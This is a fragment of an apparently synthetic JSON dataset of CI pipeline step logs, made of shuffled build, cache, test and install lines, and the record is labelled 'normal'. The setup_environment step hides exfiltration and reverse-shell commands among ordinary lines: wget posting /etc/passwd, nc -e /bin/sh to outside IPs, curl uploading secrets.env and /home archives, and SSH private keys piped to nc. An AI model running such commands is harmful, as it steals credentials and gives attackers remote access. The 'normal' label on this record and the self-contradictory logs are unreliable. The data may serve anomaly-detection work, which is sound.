          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-2153",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Cache hit for key-1062",
          "Cache hit for key-8817",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-4142",
          "  PASS: test_user_create (225ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-1698",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "\u2713 build completed",
          "\u2717 build failed with exit code 42",
          "  PASS: test_user_create (256ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 115",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Cache hit for key-2319",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1364",
          "\u2713 lint completed",
          "Installing react@5.9.0",
          "Cache hit for key-3109",
          "  PASS: test_db_connect (54ms)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing express@5.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_auth_login (211ms)",
          "  PASS: test_cache_hit (403ms)",
          "  PASS: test_db_connect (330ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (293ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-5202",
          "  PASS: test_auth_login (100ms)",
          "Step 8/10: Building",
          "WARNING: express has known vulnerabilities",
          "Installing axios@1.2.0",
          "Cache hit for key-5692",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (78ms)",
          "  PASS: test_cache_hit (321ms)",
          "  PASS: test_auth_login (182ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-6228",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_cache_hit (26ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (190ms)",
          "Installing express@2.18.0",
          "Cache hit for key-7211",
          "Installing webpack@1.18.0",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-8605",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Cache hit for key-8729",
          "  PASS: test_user_create (45ms)",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (65ms)",
          "Cache hit for key-8261",
          "Step 9/10: Building",
          "Cache hit for key-7342",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (316ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-6302",
          "Step 2/10: Building",
          "Cache hit for key-9530",
          "Cache hit for key-1074",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 7/10: Building",
          "Installing axios@4.2.0",
          "Cache hit for key-9613",
          "  PASS: test_db_connect (116ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Installing prettier@5.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 1/10: Building",
          "Cache hit for key-3651",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-8195",
          "Compiling src/utils.go...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Installing eslint@4.19.0",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-5325",
          "Cache hit for key-4757",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@3.7.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 test completed",
          "Installing react@3.19.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing webpack@1.8.0",
          "  PASS: test_user_create (83ms)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-28T12:02:05.054553",
        "finished_at": "2025-11-28T12:02:10.505088",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-3206",
          "Installing jest@1.5.0",
          "  PASS: test_db_connect (20ms)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (97ms)",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Cache hit for key-5740",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Installing prettier@3.9.0",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "Cache hit for key-4702",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2717 build failed with exit code 41",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (314ms)",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (82ms)",
          "  PASS: test_db_connect (340ms)",
          "Installing jest@4.20.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "\u2717 build failed with exit code 40",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Cache hit for key-8303",
          "Installing eslint@1.0.0",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (59ms)",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:30] INFO: Processing request",
          "Installing jest@5.3.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Exception: ValueError",
          "Compiling src/service.java...",
          "Installing express@1.8.0",
          "Step 6/10: Building",
          "Cache hit for key-4696",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing lodash@3.16.0",
          "Cache hit for key-7285",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Installing express@5.8.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_user_create (466ms)",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4752",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-6003",
          "Installing webpack@4.17.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing express@4.8.0",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_api_health (249ms)",
          "Cache hit for key-6105",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_auth_login (9ms)",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-9004",
          "Step 10/10: Building",
          "Cache hit for key-6920",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-3885",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (157ms)",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_api_health (106ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-4591",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing react@1.3.0",
          "Compiling src/main.py...",
          "Installing axios@1.19.0",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (374ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 6/10: Building",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Installing react@5.13.0",
          "  PASS: test_auth_login (222ms)",
          "Cache hit for key-8663",
          "Installing webpack@1.13.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_db_connect (200ms)",
          "WARNING: prettier has known vulnerabilities",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-8909",
          "Cache hit for key-6186",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-2068",
          "  PASS: test_db_connect (77ms)",
          "Installing react@5.10.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing react@4.9.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@2.8.0",
          "Step 7/10: Building",
          "  PASS: test_auth_login (191ms)",
          "Installing webpack@2.4.0",
          "Cache hit for key-1076",
          "Step 5/10: Building",
          "Installing axios@4.7.0",
          "  PASS: test_user_create (177ms)",
          "Installing jest@4.11.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-9278",
          "\u2713 build completed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:02:10.505088",
        "finished_at": "2025-11-28T12:02:15.955623",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/app.ts...",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_auth_login (340ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (397ms)",
          "Step 5/10: Building",
          "Cache hit for key-7930",
          "Installing express@3.2.0",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (392ms)",
          "Cache hit for key-8707",
          "Cache hit for key-7876",
          "  PASS: test_user_create (482ms)",
          "Installing express@5.14.0",
          "  PASS: test_auth_login (282ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4162",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing express@2.2.0",
          "\u2717 build failed with exit code 8",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-8893",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing axios@5.9.0",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-5418",
          "[12:00:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1163",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 3/10: Building",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (205ms)",
          "  PASS: test_db_connect (315ms)",
          "Cache hit for key-1487",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (64ms)",
          "  PASS: test_cache_hit (50ms)",
          "Cache hit for key-8099",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Installing express@1.17.0",
          "  PASS: test_user_create (147ms)",
          "\u2713 lint completed",
          "Installing eslint@1.7.0",
          "Cache hit for key-7961",
          "  PASS: test_cache_hit (488ms)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing prettier@1.12.0",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing webpack@4.15.0",
          "Step 9/10: Building",
          "Cache hit for key-6074",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "[12:00:30] ERROR: Connection failed",
          "Compiling src/service.java...",
          "  PASS: test_api_health (494ms)",
          "Cache hit for key-2782",
          "Installing jest@5.4.0",
          "Cache hit for key-9662",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-2921",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@5.9.0",
          "[12:00:30] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 118",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Cache hit for key-8684",
          "Step 3/10: Building",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Installing axios@4.17.0",
          "Installing lodash@5.11.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-4868",
          "Compiling src/service.java...",
          "  PASS: test_user_create (76ms)",
          "Cache hit for key-5188",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_db_connect (206ms)",
          "  PASS: test_api_health (483ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing eslint@2.7.0",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-7461",
          "Installing eslint@3.13.0",
          "Installing prettier@2.9.0",
          "\u2713 build completed",
          "Cache hit for key-8293",
          "\u2713 test completed",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Installing axios@2.12.0",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-6928",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "Step 3/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6808",
          "Installing prettier@2.5.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing axios@3.11.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9752",
          "Cache hit for key-9715",
          "Cache hit for key-2667",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Step 4/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing jest@5.18.0",
          "Installing eslint@5.9.0",
          "Installing eslint@1.7.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "  PASS: test_user_create (360ms)",
          "Installing axios@3.9.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-28T12:02:15.955623",
        "finished_at": "2025-11-28T12:02:25.039848",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (325ms)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (174ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-7229",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_api_health (60ms)",
          "[12:00:30] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing axios@5.5.0",
          "Installing prettier@5.5.0",
          "Cache hit for key-3441",
          "Artifact uploaded: build.tar.gz (21MB)",
          "nc -e /bin/sh 17.216.246.129 58016",
          "  PASS: test_cache_hit (366ms)",
          "Compiling src/handler.rs...",
          "Installing axios@5.15.0",
          "[12:00:30] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing eslint@4.18.0",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "Cache hit for key-9621",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-7045",
          "Cache hit for key-6571",
          "  PASS: test_cache_hit (497ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Installing prettier@1.13.0",
          "Installing lodash@2.1.0",
          "Cache hit for key-1119",
          "  PASS: test_db_connect (354ms)",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@3.6.0",
          "  PASS: test_api_health (379ms)",
          "Exception: NullPointerException",
          "  PASS: test_user_create (149ms)",
          "\u2713 build completed",
          "nc -e /bin/sh 165.216.123.4 5069",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-9388",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_db_connect (464ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (393ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing express@5.16.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Sending 319MB of data to test.io",
          "\u2713 lint completed",
          "  PASS: test_api_health (468ms)",
          "[12:00:30] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 98.207.125.151 42855",
          "  PASS: test_cache_hit (44ms)",
          "Installing express@2.3.0",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (354ms)",
          "Cache hit for key-2470",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (232ms)",
          "  PASS: test_cache_hit (281ms)",
          "Installing eslint@2.9.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Cache hit for key-5321",
          "Sending 392MB of data to test.io",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (485ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing prettier@4.11.0",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing jest@5.13.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 90.103.226.106 57309",
          "[12:00:30] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 10/10: Building",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Sending 262MB of data to test.io",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 72.179.128.6 31641",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (437ms)",
          "Cache hit for key-2195",
          "  PASS: test_cache_hit (313ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-5067",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_cache_hit (119ms)",
          "  PASS: test_auth_login (463ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2717 build failed with exit code 69",
          "Cache hit for key-3055",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (236ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 222.56.143.35 54889",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-1970",
          "[12:00:30] INFO: Processing request",
          "Step 5/10: Building",
          "Installing express@3.15.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Compiling src/main.py...",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-3698",
          "Installing jest@3.19.0",
          "\u2713 build completed",
          "Installing webpack@5.4.0",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-2452",
          "Cache hit for key-5392",
          "\u2717 build failed with exit code 38",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "Exception: RuntimeError",
          "  PASS: test_auth_login (21ms)",
          "\u2717 build failed with exit code 89",
          "=== Step setup_environment completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}